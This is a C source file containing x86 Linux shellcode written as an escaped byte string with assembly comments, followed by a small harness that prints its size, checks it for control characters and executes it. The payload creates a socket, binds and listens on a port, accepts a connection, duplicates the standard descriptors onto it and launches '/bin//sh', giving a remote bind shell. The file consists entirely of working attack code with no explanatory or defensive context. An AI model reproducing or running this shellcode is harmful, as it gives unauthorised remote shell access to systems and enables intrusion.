#include <stdio.h>

char code[] =

   "\x31\xdb" // xor    ebx, ebx
   "\xf7\xe3" // mul    ebx
   "\xb0\x66" // mov     al, 102
   "\x53" // push    ebx
   "\x43" // inc     ebx
   "\x53" // push    ebx
   "\x43" // inc     ebx
   "\x53" // push    ebx
   "\x89\xe1" // mov     ecx, esp
   "\x4b" // dec     ebx
   "\xcd\x80" // int     80h
   "\x89\xc7" // mov     edi, eax
   "\x52" // push    edx
   "\x66\x68\x4e\x20" // push    word 8270
   "\x43" // inc     ebx
   "\x66\x53" // push    bx
   "\x89\xe1" // mov     ecx, esp
   "\xb0\xef" // mov    al, 239
   "\xf6\xd0" // not    al
   "\x50" // push    eax
   "\x51" // push    ecx
   "\x57" // push    edi
   "\x89\xe1" // mov     ecx, esp
   "\xb0\x66" // mov     al, 102
   "\xcd\x80" // int     80h
   "\xb0\x66" // mov     al, 102
   "\x43" // inc    ebx
   "\x43" // inc    ebx
   "\xcd\x80" // int     80h
   "\x50" // push    eax
   "\x50" // push    eax
   "\x57" // push    edi
   "\x89\xe1" // mov    ecx, esp
   "\x43" // inc    ebx
   "\xb0\x66" // mov    al, 102
   "\xcd\x80" // int    80h
   "\x89\xd9" // mov    ecx, ebx
   "\x89\xc3" // mov     ebx, eax
   "\xb0\x3f" // mov     al, 63
   "\x49" // dec     ecx
   "\xcd\x80" // int     80h
   "\x41" // inc     ecx
   "\xe2\xf8" // loop    lp
   "\x51" // push    ecx
   "\x68\x6e\x2f\x73\x68" // push    dword 68732f6eh
   "\x68\x2f\x2f\x62\x69" // push    dword 69622f2fh
   "\x89\xe3" // mov     ebx, esp
   "\x51" // push    ecx
   "\x53" // push    ebx
   "\x89\xe1" // mov    ecx, esp
   "\xb0\xf4" // mov    al, 244
   "\xf6\xd0" // not    al
   "\xcd\x80"; // int     80h


main() {
  void (*a)() = (void *)code;
  int i;
  printf("size: %d bytes\n", strlen(code));
  printf("Testing for cntrl characters.. ");
  for(i=0;i<strlen(code);i++)
     if(iscntrl(code[i])) printf("FAILED\n"), exit(255);
  printf("PASSED\n");
  a();
} 
